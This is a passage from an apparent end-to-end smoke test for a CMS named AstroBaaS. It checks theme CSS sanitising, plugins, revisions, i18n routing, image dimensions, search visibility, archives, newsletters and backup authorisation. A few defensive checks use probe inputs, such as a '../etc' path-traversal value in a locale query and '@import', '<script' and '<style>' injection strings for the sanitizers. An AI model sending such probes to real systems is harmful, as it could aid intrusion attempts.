    const kept = /\.smoke-custom\{color:#123456\}/.test(css2);
    const strippedImport = !/@import/i.test(css2);
    const strippedTags = !/<\/style|<script/i.test(css2);
    if (setCss.status === 200 && kept && strippedImport && strippedTags) {
      ok('theme customCSS served via /theme.css, sanitized (@import + tags stripped)');
    } else {
      fail('theme customCSS', `status=${setCss.status} kept=${kept} noImport=${strippedImport} noTags=${strippedTags}`);
    }

    // ThemeConfig.layout is gone (schema v3) — the API must not resurrect it.
    const tget = await (await fetch(`${BASE}/api/themes/get`, { headers: { Cookie: sessionCookie } })).json().catch(() => null);
    if (tget?.data?.settings && !('headerStyle' in tget.data.settings)) {
      ok('themes API no longer exposes the dead layout config');
    } else {
      fail('theme layout removal', JSON.stringify(tget?.data?.settings || {}).slice(0, 120));
    }
  }

  // 8h. Plugins: list, activate, and verify the filter affects rendered output.
  if (sessionCookie && csrfToken) {
    const hdrs = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const list = await fetch(`${BASE}/api/plugins`, { headers: { Cookie: sessionCookie } });
    const lj = await list.json().catch(() => null);
    if (list.status === 200 && Array.isArray(lj?.data) && lj.data.some((p) => p.id === 'reading-time')) {
      ok('GET /api/plugins lists bundled plugins');
    } else {
      fail('GET /api/plugins', JSON.stringify(lj));
    }

    // Anon cannot list plugins.
    const anon = await fetch(`${BASE}/api/plugins`);
    if (anon.status === 401 || anon.status === 403) ok('GET /api/plugins (anon) blocked');
    else fail('GET /api/plugins anon', `status=${anon.status}`);

    // Activate reading-time, then its filter should prepend to the public post body.
    const tog = await fetch(`${BASE}/api/plugins/toggle`, {
      method: 'POST',
      headers: hdrs,
      body: JSON.stringify({ id: 'reading-time', active: true }),
    });
    if (tog.status === 200) ok('POST /api/plugins/toggle activates reading-time');
    else fail('POST /api/plugins/toggle', `status=${tog.status}`);

    // The seed published post should now carry the reading-time badge — on the
    // RENDERED view. `content` deliberately stays raw so the admin editor can
    // read it and save it back without baking the filter's output into the
    // stored post (see the round-trip test above).
    const postRes = await fetch(`${BASE}/api/posts/welcome-to-astrobaas`);
    const pj = await postRes.json().catch(() => null);
    if (pj?.data?.content_rendered?.includes('min read')) ok('active plugin filter affects rendered post content');
    else fail('plugin filter effect', (pj?.data?.content_rendered || '(no content_rendered)').slice(0, 60));
    if (!pj?.data?.content?.includes('min read')) ok('...while the stored content stays clean');
    else fail('raw content polluted', (pj?.data?.content || '').slice(0, 80));

    // Deactivate again to leave a clean state.
    await fetch(`${BASE}/api/plugins/toggle`, {
      method: 'POST',
      headers: hdrs,
      body: JSON.stringify({ id: 'reading-time', active: false }),
    });

    // 8h2. Plugin CSS: contributed via the `plugin_styles` hook and served as an
    // external stylesheet (/plugins.css), because a per-request inline <style>
    // has no build-time hash and the strict CSP would silently drop it.
    {
      // Inactive → nothing linked, and the stylesheet is empty.
      const before = await (await fetch(`${BASE}/`)).text();
      if (!before.includes('/plugins.css')) ok('no /plugins.css link when no plugin adds CSS');
      else fail('plugins.css link', 'linked even though no CSS plugin is active');

      await fetch(`${BASE}/api/plugins/toggle`, {
        method: 'POST',
        headers: hdrs,
        body: JSON.stringify({ id: 'print-styles', active: true }),
      });

      const html = await (await fetch(`${BASE}/`)).text();
      if (/<link[^>]+href="\/plugins\.css"/.test(html)) ok('active CSS plugin links /plugins.css');
      else fail('plugins.css link', 'not linked after activating print-styles');

      // The PLUGIN's CSS must not be inlined (it would be CSP-dead). Astro's own
      // component styles are inlined and hashed at build time — those are fine.
      const head = html.slice(0, html.indexOf('</head>'));
      if (!/astrobaas:print-styles/.test(head)) ok('plugin CSS is not inlined into <head>');
      else fail('plugin CSS inlining', 'plugin CSS found inline in <head>');

      const cssRes = await fetch(`${BASE}/plugins.css`);
      const cssBody = await cssRes.text();
      const ct = cssRes.headers.get('content-type') || '';
      if (cssRes.status === 200 && ct.includes('text/css') && /astrobaas:print-styles/.test(cssBody)) {
        ok('/plugins.css serves the active plugin CSS');
      } else {
        fail('/plugins.css', `status=${cssRes.status} ct=${ct} len=${cssBody.length}`);
      }

      await fetch(`${BASE}/api/plugins/toggle`, {
        method: 'POST',
        headers: hdrs,
        body: JSON.stringify({ id: 'print-styles', active: false }),
      });
    }

    // The head_tags sanitizer must strip <style> outright — a plugin can't
    // smuggle CSS-in-markup that the CSP would silently kill.
    {
      const { sanitizeHeadHtml } = await loadSanitize();
      const stripped = sanitizeHeadHtml('<meta name="x" content="1"><style>.a{color:red}</style>');
      if (!/<style/i.test(stripped) && /<meta/i.test(stripped)) {
        ok('head_tags sanitizer strips <style> but keeps <meta>');
      } else {
        fail('head_tags style allowlist', stripped);
      }
    }
  }

  // 8f2. POST REVISIONS + AUTOSAVE: edits snapshot the PREVIOUS content, autosave
  // never publishes, restore is itself undoable, retention prunes, and none of it
  // is reachable without a session (revisions hold unpublished draft text).
  if (sessionCookie && csrfToken && createdPostId) {
    const rh = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const revUrl = `${BASE}/api/posts/${createdPostId}/revisions`;

    // Anonymous callers must not see draft history at all.
    const anonRev = await fetch(revUrl);
    if (anonRev.status === 401 || anonRev.status === 403) ok('revisions are not publicly readable');
    else fail('revision authz', `expected 401/403, got ${anonRev.status}`);

    // Editing a post snapshots what it looked like BEFORE the edit.
    const origTitle = 'Smoke test post';
    await fetch(`${BASE}/api/posts/${createdPostId}`, {
      method: 'PUT', headers: rh,
      body: JSON.stringify({ title: 'Revision v2', content: '<p>second</p>' }),
    });
    const afterEdit = await (await fetch(revUrl, { headers: { Cookie: sessionCookie } })).json().catch(() => null);
    const revs = afterEdit?.data || [];
    if (revs.length >= 1 && revs[0].title === origTitle && revs[0].kind === 'edit')
      ok('editing a post captures the PREVIOUS content as a revision');
    else fail('revision on edit', JSON.stringify(revs[0] || {}).slice(0, 160));

    // Autosave stores a draft snapshot WITHOUT changing the live post.
    const auto = await fetch(revUrl, {
      method: 'POST', headers: rh,
      body: JSON.stringify({ title: 'Unsaved draft', content: '<p>draft in progress</p>' }),
    });
    if (auto.status === 201) ok('autosave stores a draft revision');
    else fail('autosave', `status=${auto.status}`);
    const livePost = await (await fetch(`${BASE}/api/posts/${createdPostId}`, { headers: { Cookie: sessionCookie } })).json().catch(() => null);
    if (livePost?.data?.title === 'Revision v2') ok('autosave does NOT modify the live post');
    else fail('autosave isolation', `live title=${livePost?.data?.title}`);

    // A no-op autosave is not stored twice (retention would fill with dupes).
    const dupe = await fetch(revUrl, {
      method: 'POST', headers: rh,
      body: JSON.stringify({ title: 'Unsaved draft', content: '<p>draft in progress</p>' }),
    });
    const dupeJson = await dupe.json().catch(() => null);
    if (dupe.status === 200 && dupeJson?.data?.saved === false) ok('identical autosave is skipped');
    else fail('autosave dedupe', `status=${dupe.status} ${JSON.stringify(dupeJson?.data)}`);

    // Restore: puts the old content back, and snapshots the current state first.
    const list = await (await fetch(revUrl, { headers: { Cookie: sessionCookie } })).json().catch(() => null);
    const target = (list?.data || []).find((r) => r.title === origTitle);
    if (target) {
      const res = await fetch(`${BASE}/api/posts/${createdPostId}/restore`, {
        method: 'POST', headers: rh, body: JSON.stringify({ revision_id: target.id }),
      });
      const restored = await res.json().catch(() => null);
      if (res.status === 200 && restored?.data?.title === origTitle) ok('restore reverts the post to a revision');
      else fail('restore', `status=${res.status} title=${restored?.data?.title}`);

      const afterRestore = await (await fetch(revUrl, { headers: { Cookie: sessionCookie } })).json().catch(() => null);
      if ((afterRestore?.data || []).some((r) => r.title === 'Revision v2'))
        ok('restore is undoable (pre-restore state was snapshotted)');
      else fail('restore undoable', 'no revision captured before restoring');
    } else {
      fail('restore setup', 'original revision not found');
    }

    // A revision from ANOTHER post must not be restorable onto this one.
    const other = await fetch(`${BASE}/api/posts`, {
      method: 'POST', headers: rh,
      body: JSON.stringify({ title: 'Other post for revision guard', status: 'draft' }),
    });
    const otherId = (await other.json().catch(() => null))?.data?.id;
    if (otherId) {
      await fetch(`${BASE}/api/posts/${otherId}`, {
        method: 'PUT', headers: rh, body: JSON.stringify({ title: 'Other v2' }),
      });
      const otherRevs = await (await fetch(`${BASE}/api/posts/${otherId}/revisions`, { headers: { Cookie: sessionCookie } })).json().catch(() => null);
      const foreign = (otherRevs?.data || [])[0];
      if (foreign) {
        const bad = await fetch(`${BASE}/api/posts/${createdPostId}/restore`, {
          method: 'POST', headers: rh, body: JSON.stringify({ revision_id: foreign.id }),
        });
        if (bad.status === 400) ok('a revision from another post cannot be restored');
        else fail('cross-post restore guard', `expected 400, got ${bad.status}`);
      }
    }

    // Retention: hammer autosave past the cap and confirm it prunes.
    for (let i = 0; i < 8; i++) {
      await fetch(revUrl, {
        method: 'POST', headers: rh,
        body: JSON.stringify({ title: `retention ${i}`, content: `<p>${i}</p>` }),
      });
    }
    const capped = await (await fetch(`${revUrl}?limit=200`, { headers: { Cookie: sessionCookie } })).json().catch(() => null);
    const keep = capped?.meta?.keep ?? 20;
    if ((capped?.data || []).length <= keep) ok(`retention caps revisions at ${keep} per post`);
    else fail('retention', `${(capped?.data || []).length} revisions > keep=${keep}`);

    // Deleting a post removes its revisions (no orphaned draft text).
    if (otherId) {
      await fetch(`${BASE}/api/posts/${otherId}`, { method: 'DELETE', headers: rh });
      const orphan = await fetch(`${BASE}/api/posts/${otherId}/revisions`, { headers: { Cookie: sessionCookie } });
      if (orphan.status === 404) ok('deleting a post removes its revisions');
      else fail('revision cleanup', `expected 404 after delete, got ${orphan.status}`);
    }
  }

  // 8g3. THEME SLOTS: activating a theme must change the site's MARKUP, not just
  // its colors — that is the whole point of template overrides. The `editorial`
  // theme overrides Header + PostCard and inherits everything else.
  if (sessionCookie && csrfToken) {
    const th = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const activate = (id) =>
      fetch(`${BASE}/api/themes/activate`, { method: 'POST', headers: th, body: JSON.stringify({ id }) });

    // Default theme → built-in markup, no editorial markers anywhere.
    await activate('default');
    const defHtml = await (await fetch(`${BASE}/blog`)).text();
    if (!/editorial-header|editorial-card/.test(defHtml)) ok('default theme renders built-in templates');
    else fail('default theme markup', 'editorial markers present under the default theme');

    // Switch → the overridden slots render the theme's markup instead.
    const act = await activate('editorial');
    if (act.status === 200) ok('POST /api/themes/activate switches theme');
    else fail('theme activate', `status=${act.status}`);

    const edHtml = await (await fetch(`${BASE}/blog`)).text();
    if (/editorial-header/.test(edHtml)) ok('theme Header override renders');
    else fail('theme Header override', 'editorial-header missing after activation');
    if (/editorial-card/.test(edHtml)) ok('theme PostCard override renders');
    else fail('theme PostCard override', 'editorial-card missing (need >1 published post)');

    // Slots the theme does NOT override must still come from the defaults.
    if (/<footer/i.test(edHtml)) ok('un-overridden slots inherit the built-in default');
    else fail('slot inheritance', 'default Footer missing under the editorial theme');

    // Switching back fully reverts the markup (no leakage between themes).
    await activate('default');
    const backHtml = await (await fetch(`${BASE}/blog`)).text();
    if (!/editorial-header|editorial-card/.test(backHtml)) ok('switching back restores the built-in templates');
    else fail('theme revert', 'editorial markup still present after switching back');

    // The catalog is the CODE registry: a theme with no module is not offered.
    const listed = await (await fetch(`${BASE}/admin/themes`, { headers: { Cookie: sessionCookie } })).text();
    if (/Editorial/.test(listed) && !/Business Pro/.test(listed)) ok('theme catalog comes from the code registry');
    else fail('theme catalog', 'admin lists a theme with no module, or omits Editorial');
  }

  // 8g2. i18n: locale config is public, posts carry a locale, and ?locale=
  // filters. The server runs with SITE_LOCALES=en,de,el (see serverEnv).
  {
    const lr = await fetch(`${BASE}/api/locales`);
    const lj = await lr.json().catch(() => null);
    if (lr.status === 200 && JSON.stringify(lj?.data?.locales) === JSON.stringify(['en', 'de', 'el', 'ar']) && lj.data.default === 'en' && lj.data.multilingual === true)
      ok('GET /api/locales (public) reports the configured locales');
    else fail('GET /api/locales', `status=${lr.status} ${JSON.stringify(lj?.data)}`);
  }

  if (sessionCookie && csrfToken) {
    const wh = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const mkPost = (extra) =>
      fetch(`${BASE}/api/posts`, {
        method: 'POST',
        headers: wh,
        body: JSON.stringify({ title: `i18n ${extra.locale ?? 'default'} ${Date.now()}`, status: 'published', ...extra }),
      });

    // A post with no locale is stamped with the default.
    const defRes = await mkPost({});
    const defJson = await defRes.json().catch(() => null);
    if (defRes.status === 201 && defJson?.data?.locale === 'en') ok('new post is stamped with the default locale');
    else fail('post default locale', `status=${defRes.status} locale=${defJson?.data?.locale}`);

    // An explicit, configured locale is honoured, and translation_of groups it.
    const deRes = await mkPost({ locale: 'de', translation_of: defJson?.data?.id });
    const deJson = await deRes.json().catch(() => null);
    if (deRes.status === 201 && deJson?.data?.locale === 'de' && deJson.data.translation_of === defJson?.data?.id)
      ok('post accepts an explicit locale + translation_of');
    else fail('post explicit locale', `status=${deRes.status} ${JSON.stringify(deJson?.data)?.slice(0, 120)}`);

    // An UNCONFIGURED locale is refused rather than silently coerced.
    const badLoc = await mkPost({ locale: 'zz' });
    if (badLoc.status === 422) ok('post rejects an unconfigured locale (no silent coercion)');
    else fail('post bad locale', `expected 422, got ${badLoc.status}`);

    // ?locale= filters the list, and each side is exclusive.
    const enList = await (await fetch(`${BASE}/api/posts?locale=en&limit=200`)).json().catch(() => null);
    const deList = await (await fetch(`${BASE}/api/posts?locale=de&limit=200`)).json().catch(() => null);
    const enIds = (enList?.data || []).map((p) => p.id);
    const deIds = (deList?.data || []).map((p) => p.id);
    if (enIds.includes(defJson?.data?.id) && !enIds.includes(deJson?.data?.id)) ok('?locale=en excludes the German post');
    else fail('locale filter en', `en=${enIds.length}`);
    if (deIds.includes(deJson?.data?.id) && !deIds.includes(defJson?.data?.id)) ok('?locale=de returns only German posts');
    else fail('locale filter de', `de=${deIds.length}`);

    // Seed posts predate i18n → they must still appear under the default locale.
    const seedVisible = (enList?.data || []).some((p) => p.slug === 'welcome-to-astrobaas');
    if (seedVisible) ok('pre-i18n posts remain visible under the default locale');
    else fail('legacy post visibility', 'seed post missing from ?locale=en');

    // An unknown ?locale= falls back to the default instead of returning nothing.
    const junk = await (await fetch(`${BASE}/api/posts?locale=../etc&limit=200`)).json().catch(() => null);
    if ((junk?.data || []).length === enIds.length) ok('unknown ?locale= falls back to the default');
    else fail('locale fallback', `got ${(junk?.data || []).length} vs en ${enIds.length}`);

    // Localized routing: the /de/ prefix is rewritten away and served.
    const deHome = await fetch(`${BASE}/de/`);
    if (deHome.status === 200) ok('localized route /de/ is served (middleware prefix rewrite)');
    else fail('localized routing', `status=${deHome.status}`);

    // …and it serves the LANGUAGE's content, not just the same page: the German
    // post appears under /de/blog and the English one does not (and vice versa).
    const deBlog = await (await fetch(`${BASE}/de/blog`)).text();
    const enBlog = await (await fetch(`${BASE}/blog`)).text();
    const deTitle = deJson?.data?.title || '';
    const enTitle = defJson?.data?.title || '';
    if (deTitle && enTitle && deBlog.includes(deTitle) && !deBlog.includes(enTitle))
      ok('/de/blog lists only German posts');
    else fail('localized blog content (de)', `deHasDe=${deBlog.includes(deTitle)} deHasEn=${deBlog.includes(enTitle)}`);
    if (enBlog.includes(enTitle) && !enBlog.includes(deTitle)) ok('/blog lists only default-locale posts');
    else fail('localized blog content (en)', `enHasEn=${enBlog.includes(enTitle)} enHasDe=${enBlog.includes(deTitle)}`);
 
    // ---- The VISIBLE site has to agree with the metadata ----
    //
    // Everything above proves the locale prefix routes and filters. None of it
    // proved a reader could USE it: the nav, footer and cards all carried
    // hardcoded hrefs, so /de/blog rendered German posts under a header whose
    // every link pointed back at the English site. The prefix was a one-way
    // door, and the sitemap advertised URLs nothing on the site linked to.

    // 1. The chrome keeps the reader in their language — everywhere EXCEPT the
    //    language switcher, whose entire job is to offer the way out. Its
    //    English entry legitimately points at the unprefixed URL, so it is
    //    excised before the check rather than special-cased inside it.
    const switcherNav = /<nav[^>]+aria-label="Language">[\s\S]*?<\/nav>/.exec(deBlog);
    const deChrome = switcherNav
      ? deBlog.slice(0, switcherNav.index) + deBlog.slice(switcherNav.index + switcherNav[0].length)
      : deBlog;
    const deNav = [...deChrome.matchAll(/href="(\/[^"]*)"/g)].map((m) => m[1]);
    const strayed = deNav.filter(
      (h) => /^\/(blog|about|contact)$/.test(h) || h === '/',
    );
    if (strayed.length === 0) ok('/de/blog: no nav link drops the reader out of /de');
    else fail('locale-aware nav', `${strayed.length} unprefixed link(s), e.g. ${strayed.slice(0, 3).join(' ')}`);
    if (deNav.some((h) => h === '/de/blog' || h.startsWith('/de/'))) ok('/de/blog: the chrome links INTO /de');
    else fail('locale-aware nav', 'no /de/ link on the page at all');

    // 2. The language switcher exists, and is a real link a crawler can follow.
    //    A <select> that navigates on change would leave the sitemap's /de/
    //    entries unreachable, which is the gap this closes.
    const switcher = switcherNav;
    if (switcher) ok('/de/blog: a language switcher is rendered');
    else fail('language switcher', 'no aria-label="Language" nav on a multilingual install');
    if (switcher && /<a[^>]+href="\/(?!de\b)[^"]*"[^>]*hreflang=/.test(switcher[0]))
      ok('the switcher offers the OTHER languages as plain links');
    else fail('language switcher', 'no anchor out to another locale');

    // 3. A card links by the RECORD's locale, so a German post is never offered
    //    at an English URL (which is the address the sitemap does NOT list).
    if (deTitle) {
      const deSlugM = /href="(\/de\/blog\/[^"]+)"/.exec(deBlog);
      if (deSlugM) ok('/de/blog: post cards link to /de/blog/<slug>');
      else fail('post card locale', 'no /de/blog/<slug> link in a German listing');
    }

    // 4. The canonical follows the CONTENT, not the URL. A German post is served
    //    at BOTH /blog/<slug> and /de/blog/<slug> — the middleware only ever
    //    strips a prefix — and the sitemap has always listed the prefixed one.
    if (deJson?.data?.slug) {
      const unprefixed = await (await fetch(`${BASE}/blog/${deJson.data.slug}`)).text();
      const c = /<link[^>]+rel="canonical"[^>]+href="([^"]+)"/.exec(unprefixed);
      if (c && c[1].includes(`/de/blog/${deJson.data.slug}`))
        ok('a German post served at an UNPREFIXED URL still canonicalises to /de/');
      else fail('canonical follows the record', `served at /blog/${deJson.data.slug}, canonical is ${c ? c[1] : 'absent'}`);
    }

    // 5. WRITING DIRECTION (C-135). There was no `dir` attribute anywhere in
    //    the codebase, so an Arabic install rendered left-to-right and no theme
    //    token could change it. Asserted from a real response on a real locale
    //    prefix, in BOTH directions — a hard-coded `dir="rtl"` would pass the
    //    Arabic half and fail the English one.
    const arHtml = await (await fetch(`${BASE}/ar/blog`)).text();
    const enHtml = await (await fetch(`${BASE}/blog`)).text();
    const dirOf = (html) => (/<html[^>]*\sdir="(rtl|ltr)"/.exec(html) ?? [])[1];
    if (dirOf(arHtml) === 'rtl' && dirOf(enHtml) === 'ltr')
      ok('/ar renders dir="rtl" and /blog renders dir="ltr"');
    else fail('writing direction', `ar=${dirOf(arHtml)} en=${dirOf(enHtml)}`);
  }

  // 8h2c. CLS (C-58): body images carry the file's own width and height.
  //
  // The shift this prevents is invisible in a screenshot — an <img> with no
  // dimensions reserves zero height, so every paragraph below it jumps when the
  // file arrives. Proven against a REAL upload, because the numbers have to come
  // from what the image pipeline actually wrote, not from a fixture that agrees
  // with itself.
  if (sessionCookie && csrfToken && uploadedImageUrl) {
    const authedJson2 = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const mk = await fetch(`${BASE}/api/posts`, {
      method: 'POST', headers: authedJson2,
      body: JSON.stringify({
        title: 'CLS smoke',
        status: 'published',
        content: `<p>before</p><img src="${uploadedImageUrl}" alt="a">`
          + `<img src="${uploadedImageUrl}?v=2" alt="cache-busted">`
          + `<img src="${uploadedImageUrl}" alt="author sized" width="120">`
          + '<img src="/uploads/does-not-exist.webp" alt="unknown">',
      }),
    });
    const clsSlug = (await mk.json().catch(() => null))?.data?.slug;
    if (!clsSlug) {
      fail('cls fixture', `could not create the post (status ${mk.status})`);
    } else {
      const dims = (html) => [...html.matchAll(/<img\b[^>]*>/gi)]
        .filter((m) => m[0].includes('/uploads/'))
        .map((m) => ({
          src: (/\bsrc="([^"]*)"/.exec(m[0]) || [])[1] || '',
          w: (/\bwidth="(\d+)"/.exec(m[0]) || [])[1],
          h: (/\bheight="(\d+)"/.exec(m[0]) || [])[1],
        }));

      const page = await (await fetch(`${BASE}/blog/${clsSlug}`)).text();
      const onPage = dims(page);
      const plain = onPage.find((d) => d.src === uploadedImageUrl);
      if (plain && Number(plain.w) > 0 && Number(plain.h) > 0) {
        ok(`body image carries real dimensions (${plain.w}x${plain.h})`);
      } else {
        fail('cls dimensions', JSON.stringify(onPage));
      }

      const busted = onPage.find((d) => d.src.includes('?v=2'));
      if (busted && busted.w === plain?.w) ok('a cache-busting query is still the same file');
      else fail('cls cache-buster', JSON.stringify(busted));

      const authored = onPage.find((d) => d.w === '120');
      if (authored && !authored.h) ok("an author's own width is not paired with the file's height");
      else fail('cls author width', JSON.stringify(authored));

      const unknown = onPage.find((d) => d.src.includes('does-not-exist'));
      if (unknown && !unknown.w && !unknown.h) ok('an image the library does not know is left alone');
      else fail('cls unknown image', JSON.stringify(unknown));

      // ...and the API says exactly the same thing. Both live shops render
      // content_rendered themselves, so a fix that reaches only the SSR page
      // does not exist for the users who matter.
      const api = await (await fetch(`${BASE}/api/posts/${clsSlug}`)).json().catch(() => null);
      const onApi = dims(api?.data?.content_rendered || '');
      const apiPlain = onApi.find((d) => d.src === uploadedImageUrl);
      if (apiPlain && apiPlain.w === plain?.w && apiPlain.h === plain?.h) {
        ok('API content_rendered carries the SAME dimensions as the page');
      } else {
        fail('cls api parity', `page=${JSON.stringify(plain)} api=${JSON.stringify(apiPlain)}`);
      }

      // The LIST endpoint too — it renders a whole page of articles from one
      // media lookup, which is the branch a per-document fix would have missed.
      const list = await (await fetch(`${BASE}/api/posts?limit=100`)).json().catch(() => null);
      const listed = (list?.data || []).find((p) => p.slug === clsSlug);
      const onList = dims(listed?.content_rendered || '');
      if (onList.some((d) => d.src === uploadedImageUrl && d.w === plain?.w)) {
        ok('the posts LIST endpoint dimensions its images too');
      } else {
        fail('cls list endpoint', JSON.stringify(onList));
      }
    }
  }

  // 8h1t. The four audit findings that were NOT mine but were real.
  if (sessionCookie && csrfToken) {
    const aj = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const hidden = await (await fetch(`${BASE}/api/posts`, {
      method: 'POST', headers: aj,
      body: JSON.stringify({ title: 'Hidden zzqq article', status: 'published', noindex: true, content: '<p>zzqq</p>' }),
    })).json().catch(() => null);
    const page = await (await fetch(`${BASE}/api/posts`, {
      method: 'POST', headers: aj,
      body: JSON.stringify({ title: 'A zzqq page', status: 'published', kind: 'page', content: '<p>zzqq</p>' }),
    })).json().catch(() => null);

    if (hidden?.data?.id && page?.data?.id) {
      // /api/search must match the archive: no Pages, no noindex posts. The
      // response strips `kind`, so a client cannot filter them out either.
      const res = await (await fetch(`${BASE}/api/search?q=zzqq`)).json().catch(() => null);
      const slugs = (res?.data || []).map((p) => p.slug);
      if (!slugs.includes(hidden.data.slug)) ok('search: a noindex post is not returned');
      else fail('search leaks noindex', slugs.join(','));
      if (!slugs.includes(page.data.slug)) ok('search: a Page is not returned');
      else fail('search leaks pages', slugs.join(','));

      // ...and the home page honours noindex, as /blog and the sitemap do.
      const home = await (await fetch(`${BASE}/`)).text();
      if (!home.includes('Hidden zzqq article')) ok('home page: a noindex post is not listed');
      else fail('home lists noindex', 'the hidden post is on the front page');
    } else {
      fail('audit fixture', 'could not create the noindex/page fixtures');
    }
  }

  // 8h1e. ARCHIVES (C-153) and the EDITORIAL GATE (C-150).
  if (sessionCookie && csrfToken) {
    const h = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    // ?author= — the filter that already reached both drivers and was never
    // exposed, so an author archive had to pull the whole collection.
    const me = await (await fetch(`${BASE}/api/auth/me`, { headers: h })).json().catch(() => null);
    if (me?.data?.id) {
      const mine = await (await fetch(`${BASE}/api/posts?author=${encodeURIComponent(me.data.id)}&limit=5`, { headers: h }))
        .json().catch(() => null);
      if (Array.isArray(mine?.data) && mine.data.every((p) => p.author_id === me.data.id)) {
        ok('posts: ?author= narrows to one person');
      } else fail('author filter', JSON.stringify(mine?.data?.length));
      const nobody = await (await fetch(`${BASE}/api/posts?author=no-such-user`, { headers: h }))
        .json().catch(() => null);
      if ((nobody?.data || []).length === 0) ok('posts: an unknown author returns nothing, not everything');
      else fail('author filter open', JSON.stringify(nobody?.data?.length));
    }

    // Author archives are OFF by default and 404 rather than rendering empty.
    const off = await fetch(`${BASE}/blog/author/anybody`);
    if (off.status === 404) ok('archives: an author page 404s while the setting is off');
    else fail('author archive open', `status=${off.status}`);

    // A date archive needs no opt-in — a month is not a person — but a
    // malformed one is still a 404 rather than a page listing everything.
    const bad = await fetch(`${BASE}/blog/date/notayear/13`);
    if (bad.status === 404) ok('archives: a malformed date archive is a 404');
    else fail('date archive', `status=${bad.status}`);
    const good = await fetch(`${BASE}/blog/date/2026/03`);
    if (good.status === 200) ok('archives: a month archive renders');
    else fail('month archive', `status=${good.status}`);

    // THE EDITORIAL GATE. Off by default, so publishing is unchanged.
    const beforeGate = await fetch(`${BASE}/api/posts`, {
      method: 'POST', headers: h,
      body: JSON.stringify({ title: 'Gate off publish', status: 'published', content: '<p>x</p>' }),
    });
    if (beforeGate.status === 201) ok('editorial: publishing is unchanged while the setting is off');
    else fail('publish blocked when off', `status=${beforeGate.status}`);

    await fetch(`${BASE}/api/settings/update`, {
      method: 'POST', headers: h, body: JSON.stringify({ editorial_review_required: true }),
    });
    // The smoke session is an ADMIN, who may still publish — that is the point
    // of the predicate being narrower than canAuthorPosts rather than a blanket
    // block.
    const asAdmin = await fetch(`${BASE}/api/posts`, {
      method: 'POST', headers: h,
      body: JSON.stringify({ title: 'Gate on admin publish', status: 'published', content: '<p>x</p>' }),
    });
    if (asAdmin.status === 201) ok('editorial: an admin still publishes with the gate on');
    else fail('admin blocked', `status=${asAdmin.status} ${(await asAdmin.text()).slice(0, 160)}`);
    await fetch(`${BASE}/api/settings/update`, {
      method: 'POST', headers: h, body: JSON.stringify({ editorial_review_required: false }),
    });
  }

  // 8h1f. NEWSLETTER CAMPAIGNS (C-111) and the OFF-SITE BACKUP RUN (C-87).
  if (sessionCookie && csrfToken) {
    const h = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const list = await (await fetch(`${BASE}/api/newsletter/campaigns`, { headers: h }))
      .json().catch(() => null);
    if (list?.data && typeof list.data.subscriberCount === 'number') {
      ok('campaigns: the composer can see the list size');
    } else fail('campaign list', JSON.stringify(list?.data)?.slice(0, 160));
    if (typeof list?.data?.emailChannelReady === 'boolean') {
      ok('campaigns: it says whether mail can leave BEFORE anything is written');
    } else fail('emailChannelReady', JSON.stringify(list?.data)?.slice(0, 160));

    // A draft needs no channel and no audience.
    const draft = await fetch(`${BASE}/api/newsletter/campaigns`, {
      method: 'POST', headers: h,
      body: JSON.stringify({ subject: 'Smoke draft', body: 'Hello.' }),
    });
    if (draft.status === 201) ok('campaigns: a draft saves');
    else fail('campaign draft', `status=${draft.status} ${(await draft.text()).slice(0, 160)}`);

    // A SEND is refused when it could not be delivered, or when nobody is
    // subscribed — checked before anything is queued.
    const send = await fetch(`${BASE}/api/newsletter/campaigns`, {
      method: 'POST', headers: h,
      body: JSON.stringify({ subject: 'Smoke send', body: 'Hello.', send: true }),
    });
    const sendJson = await send.json().catch(() => null);
    if (send.status === 400 || send.status === 201) {
      ok('campaigns: a send either starts or is refused with a reason, never silently');
      if (send.status === 400 && /email channel|subscri/i.test(sendJson?.error?.message ?? '')) {
        ok('campaigns: and the reason names the actual obstacle');
      } else if (send.status === 201) {
        ok('campaigns: and the reply says how many it is going to');
      } else fail('campaign refusal reason', JSON.stringify(sendJson)?.slice(0, 200));
    } else fail('campaign send', `status=${send.status}`);

    // An empty subject is refused whatever else is true.
    const empty = await fetch(`${BASE}/api/newsletter/campaigns`, {
      method: 'POST', headers: h, body: JSON.stringify({ subject: '  ', body: 'x' }),
    });
    if (empty.status === 400) ok('campaigns: an empty subject is refused');
    else fail('empty subject accepted', `status=${empty.status}`);

    // The on-demand off-site run: with nothing configured it explains itself
    // rather than 500ing, which an operator would read as "backups are broken".
    const run = await fetch(`${BASE}/api/backup/run`, { method: 'POST', headers: h });
    const runJson = await run.json().catch(() => null);
    if (run.status === 400 && /destination/i.test(runJson?.error?.message ?? '')) {
      ok('backup run: says no destination is configured rather than failing');
    } else if (run.status === 200) {
      ok('backup run: ran the configured off-site backup');
    } else fail('backup run', `status=${run.status} ${JSON.stringify(runJson)?.slice(0, 160)}`);

    const anonRun = await fetch(`${BASE}/api/backup/run`, { method: 'POST' });
    if (anonRun.status === 401 || anonRun.status === 403) ok('backup run: anonymous callers are refused');
    else fail('backup run open', `status=${anonRun.status}`);
  }

  // 8h1g. COMMENTS and REVIEWS (C-142, C-35) end to end. Both are content types
  // riding the moderation primitive, so what is asserted here is the wiring:
  // off by default, on when asked, pending on arrival, and the verified-buyer
  // stamp a reviewer must not be able to send.
  if (sessionCookie && csrfToken) {
    const h = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
